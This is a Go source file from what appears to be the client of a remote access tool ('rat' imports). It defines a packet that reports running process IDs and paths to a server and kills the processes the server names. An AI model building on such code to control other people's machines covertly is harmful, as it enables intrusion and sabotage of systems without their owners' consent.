package main

import (
	"rat/client/process"
	"rat/common"
	"rat/common/processes"
)

type ProcessPacket struct {
}

func (packet ProcessPacket) GetHeader() common.PacketHeader {
	return common.ProcessHeader
}

func (packet ProcessPacket) Write(c *Connection) error {
	process.QueryProcesses()

	c.WriteInt(len(process.Processes))

	for _, proc := range process.Processes {
		c.WriteInt(proc.PID)
		c.WriteString(proc.Path)
	}

	return nil
}

func (packet ProcessPacket) Read(c *Connection) error {
	t, _ := c.ReadInt()
	len, _ := c.ReadInt()

	for i := 0; i < len; i++ {
		pid, err := c.ReadInt()

		if err != nil {
			return err
		}

		if t == processes.Kill {
			process.Kill(pid)
		}
	}

	switch t {
	case processes.Query:
		Queue <- ProcessPacket{}
	default:
		// error
	}

	return nil
}
